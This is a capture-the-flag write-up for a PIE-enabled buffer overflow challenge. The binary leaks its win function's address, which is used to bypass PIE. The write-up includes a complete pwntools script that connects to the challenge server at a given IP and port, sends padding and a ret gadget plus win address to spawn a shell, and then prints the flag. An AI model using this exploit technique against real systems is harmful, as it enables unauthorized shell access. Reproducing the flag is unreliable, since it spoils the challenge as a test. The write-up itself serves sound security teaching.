# key

## Overview
A simple Buffer Overflow challenge where the binary leaks the address of a "win" function that executes `system("/bin/sh")`.

## Analysis
The binary contains a vulnerable `gets` call (or similar unbounded read) in `main` into a 32-byte buffer at `[rbp - 0x20]`. 
It also helpfully prints out `Key: 0x...` which is the address of the `win` function at offset `0x1189`. 
Since PIE is enabled, this leak allows us to bypass it by calculating the exact addresses at runtime.

When jumping to the `win` function, we must ensure the stack is 16-byte aligned before `system` is called, otherwise it will crash on a `movaps` instruction inside `do_system`. We can fix this stack alignment by adding a single `ret` gadget before jumping to the win function.

## Solution
We send 40 bytes of padding to reach the return address, followed by the address of a `ret` gadget, and then the address of the `win` function.

```python
from pwn import *

context.arch = 'amd64'

r = remote('136.115.87.65', 31776)
line = r.recvline().decode()
print("Received:", line)

key_addr = int(line.split(' ')[1].strip(), 16)
print("Key addr (endbr64):", hex(key_addr))

# The binary prints the address of the win function
# We need an extra `ret` gadget to align the stack to 16 bytes for `system`
ret_addr = key_addr + (0x11a2 - 0x1189)
win_addr = key_addr + (0x118d - 0x1189)

# Buffer is 32 bytes + 8 bytes saved RBP = 40 bytes offset to RIP
payload = b"A" * 40
payload += p64(ret_addr)
payload += p64(win_addr)

r.sendline(payload)
r.interactive()
```

**Flag:** `LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}`
